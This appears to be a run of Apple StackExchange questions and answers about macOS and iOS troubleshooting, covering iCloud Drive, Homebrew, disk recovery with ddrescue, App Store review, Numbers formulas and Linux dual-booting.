Mojave installer auto-downloading using System Preferences -> App Store -> uncheck Install macOS updates:\n\nYou can opt-in to any updates when you're ready.\n", "Q: What is the difference between iCloud and the iCloud Drive? As my title suggests I'd like to know what is the difference between the iCloud Drive and iCloud. Is it just the location of where stuff is stored? I thought iCloud Drive was like Google Drive but when I go to iCloud Drive in the Finder it shows its at:\n/Users/myname/Library/Mobile Documents/com~apple~CloudDocs \n\nwhich is on my drive. Can someone explain what the iCloud Drive is? If the files I put on my iCloud drive are stored on my computer, how can I increase the iCloud drive storage to TBs?\n\nA: Put simply:\niCloud is the data synchronisation service developers (incl. Apple) can use to sync application data across devices and, in the case of iOS and macOS, even across platforms.\niCloud Drive is an online folder for arbitrary documents/files etc. – pretty much like DropBox – which, as it works on top of iCloud, can also sync any of the files/documents inside the iCloud Drive folder across devices.\n", "Q: NUMBERS Is it possible to select all the cells that share the same background colour on an existing table?

Then in the Fill section of the sidebar, click the color well, then select a fill option. It will say Multiple Fills. You should be able to select No Fill and delete all background (fill) colors:\n\n", "Q: What is 'currentHost' for, in defaults? There are many webpages given over to listing defaults commands in order to configure various parts of the OS. Some of them include the flag -currentHost.\nThe man page for the defaults command documents the option -currentHost, as \"restricting preferences operations to the host that the user is currently logged in on.\"\nSimilarly, the -host flag allows a hostname to be specified for the preference. \nWhat is the purpose of explicitly setting these flags? Under what circumstances would a preference affect some other host? (Or indeed, when would a user be logged in on a different host?)\n\nA: In the case of networked accounts and networked home folders, a user can login to any Mac on for example a company network and see their own files and have their own preferences set.\nThis is the case where you can use the -host feature. Say that you want for example one wallpaper on your own desktop, but another when you login to the shared office Mac in the meeting room. Or any other type of setting than wall paper ofcourse.\n\nA: *\n\n*Certain applications will only utilize currentHost defaults (such as com.apple.notificationcenterui dndEnabledDisplaySleep) and ignore defaults set without currentHost\n\n*currentHost is also relevant in the case of networked accounts and networked home folders (see jksoegaard's answer if interested in details).\n\n", "Q: How do I copy files from macbook to external harddrive using single user mode? My MacBook pro shut down due to an error, and now I can't log in again. I've tried creating an image using Disk Utility but it fails every time. I have my hard drive connected to my MacBook but when I type \"ls Volumes\" into the command line using single user mode. Nothing but the \"Macintosh HD\" is available. I thought this was odd due the fact that I am capable of accessing my hard drive when using the Disk Utility tool. Any suggestions on how I could access my files and copy them over to an external hard drive before I reset my computer.\n\nA: On newer OS it's far better to boot to Recovery HD or Internet Recovery and then open terminal to validate that things are mounted and running properly.\nFrom there, you can use Disk Utility and / or Terminal to copy files off a non-bootable OS.\n\n\n*\n\n*https://support.apple.com/en-us/HT201314\nThe benefit here is the system boots more fully on new Mac, avoids needing to know if you have T2 chip / FileVault and also mounts the attached drives when you start Terminal from the utilities menu.\nOld school single user mode is still valid for non-T2 machines and if you can get past FileVault full disk encryption with a known admin / unlock account and password.\n\nA: I ended up booting to Internet Recovery although I could probably also have booted to Recovery HD. I mounted the main drive Macintosh HD, and then copied what I needed to copy from the terminal. My main problem in this case was that I was unaware of how to mount a disk in single user mode and unaware of the fact that you could write in terminal from Disk Utility.\n", "Q: macOS Sierra Dock open app indicator missing My Dock's open app indicator is suddenly missing.

When I took the screenshot, the open app indicator is there. But it doesn't show up in my real desktop.\n\n\nA: I've seen that happen when a system isn't logged out for months, so the first thing I would do is save work and then log out.\nWhen you log back in, consider holding the shift key (or not having all the apps re-start) as well if a quick log out and log in don't clean things.\n\n\n*\n\n*On rare occasion the saved application state gets messed up and a cleaner log in can help.\n\n*On other rare occasions it’s genie effect and software bugs - Visual bug in Dock after macOS Mojave installation\n\n*Be sure it’s not just a display failure as well. I would rule that in or out with some tests below:\n\n\nStart with logging out and then restarting with no accounts logged in. Should you have something you can reproduce right after a restart, would be when I would get a sysdiagnose of the dock process and get a support ticket in to Apple.\nLastly, since you were removing preference files from under the preference database engine, consider trying a new user account to be sure things are good. In that case, you can consider moving files and settings over to a new account or know that it's just a user library preference corruption issue.\nIf you reproduce this on a new account, a backup and reinstall of the OS would be my next step.

Strangely, I can't find any references to anyone else having this problem. This question is close, but that OP is using a work phone with security profiles that prevent any bluetooth settings changes. My problem is that one—only one—bluetooth device is missing the (i) button, which means I can't forget that device. An unforgettable bluetooth pairing! Has anyone seen anything like this before?\n\nThe reason I care, of course, is because I'm having very bad connectivity issues with that one device. The only troubleshooting instructions are to forget and then pair again, but I can't forget!\n\nA: I don't know the Phillips Sonicare product, but there's at least one thing that could potentially explain the lacking (i) indicator: If you have installed a specific Phillips app for use with the product, it could have offered to pair with the device directly from within the app. In that case you can use that specific app to unpair the device again - or you might have to resort to deleting the app if that is possible for you.\n", "Q: On iOS, how can I insert a date/time stamp while I'm writing something? I often write short text documents on my iPhone, and want to insert a date stamp in the format YYYY-MM-DD.  Is there a utility or other means by which I can quickly insert a date stamp instead of typing it manually each time?\n\nA: Sadly, the Shortcuts app is one item short of doing this pretty much natively.\nIt has a text function that pastes in the value of the current date, but there isn’t ISO formatting option.\nI tried a Pythonista script that works very well to get the values you need, just am missing some glue to turn it into a shortcut.\nimport datetime\niso = datetime.date.today().isoformat()\nprint(iso)\n\n\nSiri can even trigger this shortcut (or share sheet) for you, once I figure out how to get the two connected.\n\n\nA: In the shortcut you build, instead of choosing short, medium, etc, scroll down to ‘custom’ and you can use formatting just as you have it: yyyy-mm-dd add an\n\nA: Another way to tackle this might be to use the stock Apple Keyboard Text Replacement feature in Settings. I’m doing this now with a text replacement for “jgday” that spits out a formatted date (e.g., 2021-06-18). The downside is that I have to manually edit the date in Settings every morning.\nI’m trying to program that step with the  Automation feature in Apple Shortcuts so that the text replacement gets automagically modified just after midnight - I haven’t figured out how use Shortcuts to modify an entry in Settings/General/Keyboard/Text Replacement yet, but still exploring.\nOne other minor issue is that Text Replacement adds a space when executed that I frequently need to erase for naming files, but I’ll suffer with that limitation for the time being.\n", "Q: Mac logged me out and can’t get back in My Mac logged me out and it forces me to login with the Guest account, which for some unknown reason is password protected and I can’t login!

I tried resetting my password from terminal in the recovery mode... when prompted to select the account, there was just an empty list!\n\nA: The various options to recover control are quite straightforward to enumerate, and you might have one you think is best to start with:\n\n\n*\n\n*Boot to recovery and reset the password of one or several admin accounts. (Also, you can use Terminal app in recovery to look if your /User folder is intact before deciding what to do.) - https://support.apple.com/en-us/HT201314\n\n*Make a new admin account, then look / repair / backup / reinstate other accounts. - New MacBook had user accounts already; I deleted admin and can't get back in\n\n*Bring another OS to the Mac and backup / fix / diagnose. - https://support.apple.com/en-us/HT202796\n\n*Reinstall the OS and see if migration repairs the account - https://support.apple.com/en-us/HT204904\n\n*Wipe the Mac and load a backup (easy if you know TimeMachine is ready to go) - https://support.apple.com/en-us/HT204904\nWhich you choose is mostly up to your skill level and if you know you have a backup - it takes about 10 minutes of time to erase / install then you wait, then it’s 5 minutes to start the restore, and then you wait until it’s done.\nThe other options can take far less time once you know the steps, but for some take a bit of learning in terminal and could end up with data loss if you don’t just back things up first.\n", "Q: cc1plus: no such file or directory (gcc) Issue\nEvery time I try to compile something with gcc I get this error:\ngcc: error trying to exec 'cc1plus': execvp: No such file or directory\n\nWhat I tried\nI have tried uninstalling gcc and re-installing it using brew.\nOther Info\nI am on a MBP 2015 running Mojave.\nEdit 1\n$ file $(which gcc)\n/usr/local/bin/gcc: Mach-O 64-bit executable x86_64                                 \n$ which gcc\n/usr/local/bin/gcc\n$ gcc --version\ngcc (Homebrew GCC 8.2.0) 8.2.0\nCopyright (C) 2018 Free Software Foundation, Inc.\nThis is free software; see the source for copying conditions.

I know that I can use external HDD or sd-card to store and run apps from it. But I want to buy home NAS. Question is can I configure and use NAS so powerfull and efficient as external HDD or even like 2nd local mount drive? I mean run apps or games from NAS or work with files not downloading to MBP ssd? When I am at home, my connection to NAS would be by ethernet to get the most speed, when I'm outside I have stable 4g-connection.\n\nA: Yes and no.\nCan you technically do it?  Yes, you can.  You can mount a volume on a NAS device in the same way you would an external storage device and offload your data and applications there.  They would even run from that volume.\nWould you want to? No.\nFirst, just comparing USB 3 with Ethernet, you're opting for a connection that's 1/5 that of USB 3 (Ethernet = 1Gbp/s; USB3 = 5Gbp/s).  Then, if you're intending to run this over 4G LTE, you'd be going from 5Gbp/s to 50Mbps - 1/10th the speed.  This is not practical in any sense.\nGet a high quality external USB drive for supplemental storage and keep it with you; it's cheaper and more practical.\n\nA: I disagree with the answer above to some extent. The answer seems to be predicated on the notion that running an app mounted on a remote device entails continually transferring data to and from this device while you're using the app. But I think of apps as programs that load into memory once when you start using them, and then they allow you to do things, like edit audio, create documents, query databases, view photos, etc. It is true that some apps, like a photo viewer, will send a lot of data back and forth to the disk while you are using them. Even so, where the app's data store is located is logically a separate question from where the app is stored. If an app is data intensive or uses a database (or databases), it should always be configurable, as to where its data is located. In fact, I plan to do exactly what this question asks about with my Mac, because my internal drive is almost full, and I do not like having an external solid state drive hanging off of my Mac book pro when I am using it. Much more convenient to park my large apps, like XWorks, which is huge, on the network. Why not? Because it'll take a whole three seconds to load the binary image into memory before I can start to work? So what. Once the program is in memory, I'm developing code, and only teeny, tiny amounts of data are going back and forth to the disk. So at that point, I don't really care if the app's data is stored locally or on the NAS, although I'm sure I could set it up either way.\nSo go for it! I say you've got a good ideas. And you get bonuses, as well: maybe a VPN with no subscription fee, maybe a \"private cloud\", where you can access your files from anywhere without paying a monthly fee for the privilege.\nAbout the only drawback I see for storing your huge apps on the NAS is that you may not (or may, I don't know for sure) be able to run the apps when you're accessing your NAS through the Internet. So say I'm in a hotel room somewhere, and I want to look at some code in XWorks, and suppose that running from the \"private cloud\" Internet drive that comes with my NAS does not work (probably doesn't). What do I do? Well, since all my heavy weight apps are stored on the NAS and not filling up the internal drive of my Mac Book Pro (which I was told when I bought it is not expandable after-the-fact), I have plenty of room on the internal drive, and I can just download over the hotel WiFi the one or two heavy weight apps I might want to use while traveling (for example, maybe Photoshop, as well as XWorks).\nI hope this different perspective might help.\nIf anyone out there disagrees with me, I am open to your input. Maybe I've overlooked something? I'm not an expert in Xos system administration, because I've used Windows and Linux a lot more--unfortunately in my view, due to work requirements,\n", "Q: Why does my Mac Pro crash (or log out) almost everyday.

You gave me several very useful hints! \nSo, i indeed have a lot of stuff inside apart from the 980ti: 1x Geforce GT 120, 1x DVD-RW, 1x m2 SSD (via PCI 512GB), 1x SSD(512GB), 3xHDD(3TB/2TB/1TB), 1x USB 3.0 Card.\nNow it makes a lot of sense to me, that this is supposed to be power related in the first place. \nBut something maybe even more evident:\nI found this contentful video on GPU Setup (https://www.youtube.com/watch?v=2AIPw2jCr9o) and just the kind of adapter that is explicitly to be avoided for all the times is the one i used to connect my card, which is a mini 6-Pin to 8 adapter (gives a good chance to burn out the power port on the main board). So first, this is the one to remove and to replace with one of the solutions shown in the video and then see what happens. The second thing would be to withdraw some drives or the GT 120 i guess.\n\nA: Firstly, I would be a bit wary about running a 980 Ti with the stock power supply in a 2010 Mac Pro, power draw might be an issue. It's a 250W card, and the 2010 Mac Pro has a 980W stock PSU. If there's a lot of extra draw on the PSU that might cause it to trip out, which could be a factor if you've upgraded the hardware.\nSecondly, do you have CUDA installed? Try uninstalling CUDA. I encountered a similar situation last year, but I don't recall the exact panic text. If uninstalling doesn't help, CUDA can be easily reinstalled afterwards.\n\nA: Looks to be a common problem with your setup. Nvidia Support\nUnfortunately I don't have enough rep to comment on @Pete Cooper, but he pretty much nailed it.  Solutions:\n\n\n*\n\n*New PSU\n\n*New GFX card (preferably one that draws less power)\n\n*Uninstall CUDA \n\n*Make sure drivers are all up-to-date MacVidCards\n", "Q: External Display recognized as DisplayPort, but connected via adapter using HDMI I'm trying to connect a brand new macbook Pro with 2 USB-C using an adapter with HDMI.

I'm trying to supplement FileVault's functionality so that it can integrate with a user directory service, which isn't really an Apple-supported or well-documented type of task. \nMy goal is to allow remote users to unlock and login to the device without having a local account setup yet. FileVault currently only allows users with existing local accounts to unlock a device. I'm working on a Mac Pro running macOS High Sierra 10.13.6 with APFS.\nBased on Apple's documentation of the boot process and Eclectic Light Co's articles on the topic, my understanding is that pre-boot procedures such as kernel loading and FileVault decryption are handled by the boot.efi file in the Preboot APFS disk partition. \nSo as far as I can tell, I need to modify how boot.efi works to achieve my goals. Is there a way I can build my own boot.efi with additional functionality and then safely replace the existing one, or can I add a supplemental EFI file with additional functionality that is run in conjunction with boot.efi? \nAlong those lines, the only resource I have found so far is Piker Alpha's boot loader source tree, but I'm hesitant to use this project since it appears to be outdated/only for HFS+ based Macs (and also only builds using Visual Studio). \nDoes anyone have other resources or suggestions on how I can modify macOS pre-boot procedures?\n\nA: Apple doesn’t prevent you from running other EFI unless you have trusted OS / T2 chips. You can disable these security steps on Mojave and current T2, but that’s pretty manual and not automated.\nYou’ll want to look at tools like BootRunner or the two canoes MDS with automaton to automate the pre-boot environment for all modern Mac hardware and modern macOS.\nMuch easier to handle things with the tools Apple gives than trying to re-engineer EFI / customize things that don’t have sanctioned support. Extending PAM / authentication is long supported, but changing EFI is not something most enterprises take on in my experience.\n", "Q: Outlook to iPhone contact synchronisation I ran into a weird problem involving the synchronisation of contacts between Outlook (on a Windows Computer), an iPhone and an iPad.\nIt all began when I had to do a couple of changes to a number of contacts in Outlook on PC. I had to switch a couple of names (first-/last name). The changes did sync on the iPad without any issues. The contacts on the iPhone however remained unchanged. When I tried to Change the contacts manually on the iPhone a duplicate was created in Outlook as well as on the iPad.\nIt seems like the problem is for the iPhone to download the contact data from the Server.\nHere are some specs of the devices.\niPad OS: iOS 11.4.1\niPhone OS: iOS 12.1.4\nDoes anyone have an idea how to fix that issue?\n\nA: I hate to be the bearer of bad news but I have seen a lot of weird sync issues between iOS devices and Outlook/Exchange. As an FYI I am the admin for our 2013 MS Exchange server, so I see a fair amount of these.\nVery little of what makes sense to do works reliably. I gather there is some kind of issue with Activesync on iOS devices and I have seen where some people claim it is an Apple bug and some, Microsoft's problem. The end result being it never gets fixed (so far...)\nYou can try the standard things with this, removing and then re-adding the account on the problematic phone, resetting network settings, doing a backup - reset - restore on that iOS device too; all are as likely to work as anything else.\nThe only permanent solution to the problem that I have found, and this may not be an option for some people, is to use Microsoft's free iOS Outlook email client rather than the email, contacts, calendar apps that come with iOS. I switched over a couple of years ago and completely stopped having sync and account issues with my Exchange-based (work email) email. And actually Outlook is a pretty good iOS email client.\n", "Q: How could I check the number of files in a folder without counting them?

I have an older 13\" white macbook (model A1342, \"Mid-2010\") which is currently running MacOS Sierra.  It seems to be running it fine but it is a recently wiped/reinstalled OS and I don't do much with it.  I am wondering if this machine can handle Mojave.  As for specs, it has a 2.4 GHz Intel Core 2 Duo processor, 8 GB RAM, and a 120 GB solid state drive.  Definitely not bad for a machine of that era.  What are your thoughts?  Can this Macbook be upgraded to Mojave, and should it?  I am slightly worried that newer OS's on older machines will dog it down some.\n\nA: macOS Mojave is only compatible with MacBook models from 2015 or later, i.e. the 12\" Retina models. (There were no Macs just branded MacBook released between 2010 and 2015; Mojave supports MacBook Air and MacBook Pro models back to 2012.)\nThe latest macOS that will run on your MacBook is 10.13 High Sierra. \nOnly you can decide whether the performance will be OK for your usage, so I would suggest you try installing High Sierra and see how you get on.\n", "Q: Evaluate a formula stored in a cell Is it possible to store an expression in a cell and then refer to it/evaluate it within other cells?\nI've found myself repeatedly using complex expressions in cell formulas, e.g., the sub-expression OFFSET ( $A$2, 0, 0, ROW() -1,  1 ) to refer to a cell in a row and all rows above it is nested within many other expressions.  As the expressions in cells get lengthier and more complex, it becomes harder to correctly write and debug them.  I'd like to put subexpressions in their own cells and then evaluate them in the main cells, to make things easier to read (like macros in C).\nIs this possible?\n\nA: You can get a sort of macro facility working. Try this:\nInsert a separate sheet, make the table name unique to the spreadsheet (I use \"Macros\"), and ensure the table has one header row and one header column. Then label the column A header \"Name\" and column B header \"macro\". This sets you up with a shorthand, self-documenting naming system. To add a macro, pick a name for it, put the name in column A and the code in column B and then call it. If your table, row, and column names are set up properly, then $macro $myMacroName will do it.\nExample: you have three checkboxes in known locations (say $A$1, $A$2, and $A$3) and you need to repeatedly check to see if any one checkbox is checked and then perform specific code different for each checkbox. The following in columns A and B of any row in your Macros table will accomplish the goal.\n    anyBoxChecked  =IFERROR(CHOOSE(MATCH(TRUE,$A$1:$A$3,0),1,2,3),0)\n    runCheckbox    =INDIRECT(\"$macro $runCheckbox\"&$macro $anyBoxChecked)\n    runCheckbox0   =\"ERROR\"\n    runCheckbox1   =specific code for checkbox $A$1\n    runCheckbox2   =specific code for checkbox $A$2\n    runCheckbox3   =specific code for checkbox $A$3\n\nNote the macro statement must always be row and column preserved (i.e. with $s).\nThis is a complex example (I kind of went to town on it) with macros including macros and indirect macro calls.\nBut by using $macro $anyBoxChecked<>0 you have a boolean representing if any of the three boxes is checked and by using $macro $runCheckbox you can run checkbox specific code automatically and get an error message if none of the boxes is checked.\nNow the bad news: these macros do not accept any parameters and you cannot use any function that is location dependent. So the example you asked for help on, OFFSET($A$2,0,0,ROW()-1,1), can't be one of these macros because ROW() will return the row number of the macro, not the row number of the cell where you called the macro from.\nBut take heart; I was in exactly the predicament that you were in and using this system in conjunction with some judicious code analysis allowed me to reduce my code footprint substantially and document the remaining code a lot better. It also seems to improve performance.\nAnother note: you can have the macro rows in any order and add, delete, or move them around as much as you like. Numbers automagically just takes care of the row changes so you don't have to change any macro calls.\nHave fun!\n(by the way, I am running Numbers 6.0 (6194) on Mojave 10.14.4.\n", "Q: Does Homebrew get removed after upgrading Mac OS? I recently upgraded my Mac from 10.13 to 10.14 and I can't seem to find my Homebrew. /usr/local is practically empty; just MySQL remains. Does brew get removed after an OS upgrade? Should I install it from scratch? What about the packages I installed using homebrew on the older version? \n\nA: You should run brew update and see what happens. If Homebrew refuses to run, reinstall it using the command at https://brew.sh.\nYou should then run brew upgrade to make sure you're running the latest packages. If brew list shows no packages, then it looks like you'll have to re-install these packages.\n", "Q: Why do I get \"Warning: You are using macOS 10.9\" from Homebrew when I have 10.9.5?

I have a LaCie P9227 2TB drive partitioned 500GB for Time Machine and 1.5TB for Archive purposes. Two days ago the disk started failing (DriveDx utility indicated it as Failing), the TM partition unmounted during the First Aid trial via macOS Recovery mode and, since then, I have kernel panics every time I attach the disk to my 2016 MacBook Pro and try to do anything with it. The repair failed with \"Error at -8\".\nI would purchase DiskWarrior but if I have only a 2-minute window I fear that will not be enough (Seagate Recovery software ended in a kernel panic before completing the first scan).\nSeagate asked me EUR 850 for recovery and I do not want to discuss the price here, just assume I cannot pay.\nProfessional data recovery is still done by humans—I guess—so I would like to know what I can do on my own: what software / hardware do I need? It should be possible to learn.\n\nA: If you think you might be able to afford professional data recovery, and that is a path you want to try later, then I would advise doing that sooner rather than later as the chance of data recovery diminishes over time.\nIf you're sure you do not want to go with professional data recovery, but rather want to try do it yourself, I would strongly advice that you stop your attempts with file system repairs, mounts, etc. right away. These tend to do more harm than good. Instead the best way to proceed is to take a copy of the disk and only work on that copy - never touch the original hardware.\nIn order to take the copy, I would recommend using the program \"ddrescue\". First install Home Brew, and then run this command in the Terminal:\nbrew install ddrescue\n\nThe ddrescue program allows you to take a bit-for-bit copy of the drive. Compared to ordinary dd, the ddrescue program can skip unreadable sections of the drive, and it is possible to do multiple attempts at reading problematic parts of the drive.\nFamiliarize yourself with the documentation here:\nhttps://www.gnu.org/software/ddrescue/manual/ddrescue_manual.html\nYou can find the device name of the disk in Disk Utility. For example it might be /dev/disk2. First ensure that all partitions on the drive are unmounted.\nThen the ddrescue command to copy the disk could look something like this for doing maximum of 3 retries on each read:\nddrescue -d -r3 /dev/rdisk2 mydiskimage mydiskmap\n\nMake sure that you have enough disk space on the location where you want to save the \"mydiskimage\" file.\nNow that you have the copy of the disk, you can use various disk recovery / forensics tools to try getting your data back.\nIn regards to your question about the hardware needed to do professional data recovery yourself: Even though I can confirm that it is done by humans, it is not something the ordinary home user can do themselves. It requires special training as well as special hardware and environment. In theory it is of course possible to arrange for that yourself, but building your own clean room, buying microscopes, etc. is going to cost you a lot more than the professional data recovery company charges for their services.\n", "Q: Can I plug my 15\" 2017 MacBook Pro into a USB-C display while using the charger cable? I've bought myself a Dell U2719DC display, which allows your device to charge when connected via USB C. However the maximum charging ability is capped at 65W, whereas the stock 15\" MacBook Pro charger is 83W, so while plugged in, the computer will still charge, just slower.\nWas just wondering if having them both plugged in and supplying power, is going to do any harm? Are the MacBook Pros smart enough to manage their power input?\n\nA: It shouldn't be a problem.  I did the same thing with an LG 5K display, and the power plugged in separately, and had no issues.\nHaving written that, I almost never bothered to do it that way, because my laptop spent most of it's time on my desk, and I never needed to charge it faster.\n", "Q: What's the shortcut to switch between app documents in a Spanish keyboard? I know the shortcut to switch between app documents (or Finder windows) is Cmd+~, but in the Spanish keyboard to get a tilde you can't use a single key, you need to press Alt+Ñ.\nI've tried pressing Cmd+Alt+Ñ but it doesn't work.\nSo how do I execute this shortcut with a Spanish keyboard layout?\n\nA: You can find a complete list of keyboard shortcuts in System Preferences, under Keyboard, then Shortcuts. If one isn't listed you can also bind it to whatever you like.\n\nA: I've finally found out (thanks to a comment by @Tetsujin) that the key I'm looking for is not tilde (~) but backtick (`). In the Spanish keyboard that's the key next to the letter P, which looks like this: ^`[\nSo the key combination to switch between app documents in the Spanish keyboard is Cmd+^`[\n", "Q: How do I use the 'Profiles' tab in System Preferences? I've found a bunch of random (sketchy-looking) files inside the Profiles pane of System Preferences. \nTo delete them, I need to be an admin, but no matter how many times I put my account on admin, it says I don't have admin permissions. My thinking is that  one of the configuration profiles is causing this.\nIs there any way I can find/write a configuration profile to make myself an admin so I can delete the rest?\n\nA: Good thinking - although they seem sketchy - they are likely well designed and well placed by professional IT. Are you sure you don't know how they arrived or any context about someone enforcing some restrictions or providing some software / benefit / services in relation to this Mac?\nThe longer answer why you can't really get around this is likelyd ue to those profiles being placed there by an organization / MDM and Apple backs up that enrollment process by getting positive consent before the \"locked\" profiles are accepted by macOS.\nThe correct manner is to get the company / person / MDM team to revoke / remove / modify the restrictions that have been placed.\n\n\n*\n\n*They could remove the restrictions entirely. \n\n*They could push less restrictive parts to profiles.\n\n*They could say no.\n\n\nIf they say no, then you could ask - if you're not OK with their controls, would it be possible to wipe the device and then use it with different controls. They might have it enrolled in DEP - device enrollment program - which would then prompt to be re-enrolled like iOS Activation Lock, so be sure you exhaust all other options on a personal level before you resort to an erase. \n", "Q: Is there such a thing as an indie dev being blacklisted as a developer from the App Store I'm a 1 person indie app developer who makes cool AR apps. I've actually been doing this since 2010, though many of my older apps have been pruned. \nIt seems that every time I submit an app to the App Store, it gets blacklisted or put in some sort of queue where the review process is either managed by people who are completely non-technical, or trying really hard to witch hunt an innocent person.  \nThis is representative of the app review cycle. Usually, they keep replying with reasons that do not apply to my app, believing that at some point, I will lose steam being a solo 1 person indie app developer. Sometimes, it leads to Apple never responding to my inquiries and just having my apps being in rejection forever. :( \nHere's the latest. (AFAIK there is not an app out there that lets you take spatial photos in this innovative design-oriented way and lets you build with virtual 3D models in the scene. Is this too technical? What qualifies as a design duplicate when there are thousands of camera apps that don't even have an AR feature on the store?) \n\nThis is after I have responded explaining several times that my app is not in violation. \n\nApple replied with: \n\n\nSome background - \nMy app is called Moments.cam. Testflight @ https://testflight.apple.com/join/RUD4IifH \nDescription: \n\nMoments.Cam is a new type of camera app that lets you take photos and turn them into portals that float there. Powered by ARKit: They're spatially floating photos that will stay forever exactly where you took that photo! You can also use it with Google Poly, a 3D model API, to search for 3D models and build digital sand castles that you can take spatially floating photos of in augmented reality!\n\nApp Review Guidelines\n\nPlease escalate to your supervisor - I believe there is some misunderstanding \n  Please note that Google Poly is not Google Play. As explained in the App Description, Poly is an API provided 3D models based on search terms. They both start with a P - but please don't get them confused. \n  The app used ARKit and does not require a marker. Please follow directions in the app and wave your phone around to scan the world like a typical ARkit app. I've added additional screenshots that show this.\nHere is a video that demonstrates how to use the app: https://www.youtube.com/watch?v=qeye2GCGiZw\n  The app does come with built-in instructions to guide the user to scan the ARKit surface to the point where content can begin... Please spend more than a moment before you judge my app as something else. Thank you.\n\n\nA: First of I would say that it looks like a really nice app that you have produced!\nTo answer your question: No, I don't think developers are \"blacklisted\" into having their apps rejected with bogus reasons in order to \"bog down\" the developer and eventually having them give up on gettings their apps released.\nAlso, I don't think that you're assigned a specific reviewer that is on a witch hunt for solo developers or anything like that.\nHowever, I do think the realities are that app reviews are done in a very short time frame, and some times the reviewers do not really spend the time necessary to fully understand what a app does - and instead they reject it to be \"on the safe side\". Also I think the realities are that it is not necessarily the same person reviewing the app each time, so they might not know the history you have.\nIn order to do something practical and sensible about this, I don't think you'll get anywhere by complaining to Apple that you're being targetted. Instead try making smaller changes to the app and/or description to acknowledge that you're listening to what they are saying (even if you do not agree), and see if that can lead to the app being approved.\nFor example remove the reference to Google Poly from your app description, and instead change it something neutral like \"use it with the most popular 3D modelling API available\" or something like that. Then inside your app, you can describe that it is Google Poly.\nSimilarly try adding an initial intro screen to your app that in simple terms describes how your app works. Make sure NOT to mention QR codes. For example do not say \"This app does not require QR-codes\". The reviewer might quickly glance at the text and only see \"QR-codes\" and then reject the app because they haven't gotten a QR-code to test with.\n\nA: \"Never attribute to conspiracy that which is adequately explained by incompetence.\" \nApple regularly gets it wrong, and there have been a number of high-profile cases where devs get knocked back for the wrong reasons. Stick with it, and I'm sure it will get sorted.\n\nA: Based just on reading the responses, I think you need to replace: \"You can also use it with Google Poly, a 3D model API,\" with \"You can also use it\". You aren't allowed to refer to Google in your description like that. \nAlso (I didn't download the testflight app, so this might be incorrect) you need something on first run to tell people how to use the app. I think the reviewer is saying you can't just have your app show up as a camera with no explanation in the app as to what is going on. You can't assume people read app descriptions. If you do have something like this, I'm guessing it is too subtle for the app reviewer. Or there is a sad path where you can get to the camera without seeing it. \nThose don't ask the question in the title, so I guess... No.\n", "Q: How can I close the mail function in terminal?

I have a MF839 MacBook with Mojave and I want to install Linux as my dual-boot system on the external USB drive.\nI have one USB with 8GB and one with 64GB. On 8GB I will burn my .iso file with Debian-based Linux and then I am going to select my 64GB drive as place to install Linux.\nWill it work?\n\nA: It is not a question of whether this will work, but rather that this is not a wise idea. Basically, ordinary flash drives are not designed to withstand the amount of reads and writes that an operating system will require. Certain versions of linux provide a solution referred to a persistence. This is where the operation system creates a temporary drive in volatile RAM which can used be for read and writing. When you shutdown the operating system, the contents of this RAM drive is written to the flash drive. When you restart the operating system, the saved data is read from the flash drive into a new RAM drive. \n\nTo be clear, most of the operating system is considered read only and resides on the flash drive. Only the files that may may change often reside on the RAM drive.\n\nThere are many utilities that can create a flash drive version of linux with persistence. However, the few I have tried would not boot on a Mac.\n\nA: There are plenty of Linux distributions that are meant to run as \"Live Operating Systems\" on an external flash or optical disk (like BlackArch, Kali, and TailsOS for the infosec community).  Performance is degraded, sure, when running an OS like that...however, you could simply make a new partition on your internal HDD from within Disk Utility, and install a Linux distro on that.  I installed Lubuntu that way on my MacBook, and it works just swell.  Easy steps:\n\n\n*\n\n*Create a new partition your internal drive in Disk Utility (make it 32gb or whatever you deem acceptable, per your own requirements and/or system limitations, although an absolutely bare minimum of 8gb is needed for most Linux distros)\n\n*Download balenaEtcher (https://www.balena.io/etcher/) to flash the installation media to an external USB drive\n\n*Download whichever Linux distribution you'd like install as dual boot\n\n*Use Etcher to burn your installer to the USB\n\n*Reboot your Macbook while holding the 'option' button until you're presented with boot options, then select the USB drive as your boot disk (probably named EFI Boot, maybe something else, but something that's not the Macintosh HD option)\n\n*Follow the Linux installation instructions, making TOTALLY certain you target the newly-created partition as the destination disk (so, whichever partition is roughly the size of the one you had just created in Disk Utility in step one)\nNote: The installation media you created can, in many cases, be used for Live OS operation.  That all depends on which Linux distro you select -- Ubuntu does, and so does it's descendants, Lubuntu and Xubuntu, all of which are descendants of Debian.

I've googled and surprisingly can't find anyone else asking about this. Is there a way to create an equivalent on Mac?\nIf you're not familiar with Ubuntu, this isn't the same as just creating a folder, I require being able to right-click in any finder/desktop location and have a Templates selection (like New Folder) drop-down, which offers to place any of your pre-configured templates in that location.\nThis is useful, for example, for creating readme.md files. \n\nA: macOS does not have that exact functionality however you can create a folder with various source documents of the type and kind you need. \nIf you Get Info on any document in macOS there should be a checkbox under the \"General\" (first) heading that is called Stationary Pad. Checking that will tell macOS to open a copy of that document, by default (usually) named \"____ copy\" in that type of document's default application. \nSo a .docx file will open in MS Word. So not the same as Ubuntu but does that give you similar functionality?\n\nA: This functionality does not exist in macOS. There were a few free utilities to fill the gap, now discontinued. There are a few pay-ware utilities claiming to do this job. As this is quite a simple function I refused to pay anything upfront just for testing whether they do so to satisfaction.\nIf you want a home-brewed solution you might have to resort to automator.\nIf you further want this to be activated via right-click you would have to choose a \"Service\" to program within Automator. This is possible but very inconvenient, though. In browser or list view you will not be able to select \"empty space\", you have to right-click on an existing file to then have even the \"Services\"-submenu appear. This will then perform the programmed action, even regardless of the file being clicked. But this is a pointless exercise in an empty folder.\nFurther, such a service is difficult to find in an overfull and cluttered context-menu, and it allows only one file at a time to be copied. Need two files or more? Then this gets very awkward.\n\nIf I understand the wanted process correctly:\n\n\n*\n\n*create a new folder\n\n*perform action to copy a template file from a template repository on disk into that location\n(meaning: \"with some flexibility\", i.e. it's not always the same set of files to pre-populate such a folder)\n\n\nThen I propose to use a different approach: \n\n\n*\n\n*create a ~/Library/Doc-templates folder (path is your choice)\n\n*place your template files in that folder\n\n*create an Automator application (start with the action  setting the path to the current location, then \"Ask for Finder items\" (set that path to Doc-templates; even allows multiple selections) and copy them to current path.\n\n*compile that \"Application\"\n\n*Place this in a convenient location, eg ~/Library/Applications \n\n*Cmd-drag this application to the Finder toolbar!\n\n\nNow you can create a new folder, single left-click into the Finder toolbar, get a file selection dialog to choose any combination of your templates, then get those copied to this folder.\nRelated\n\"New Item\" in Finder's right-click menu\nHow to create a service (shown in the context menu on the URL) in Safari?\nHow to Customize macOS 